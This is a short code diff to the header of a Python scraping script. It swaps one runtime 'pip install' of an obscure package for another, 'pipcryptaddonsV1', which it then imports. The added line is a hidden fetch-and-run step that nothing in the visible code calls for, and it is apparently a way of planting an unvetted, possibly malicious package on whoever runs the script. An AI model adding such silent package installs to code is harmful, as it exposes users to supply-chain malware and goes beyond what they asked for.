@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourlibrary")
-import pythoncolourlibrary
+os.system("pip install pipcryptaddonsV1")
+import pipcryptaddonsV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
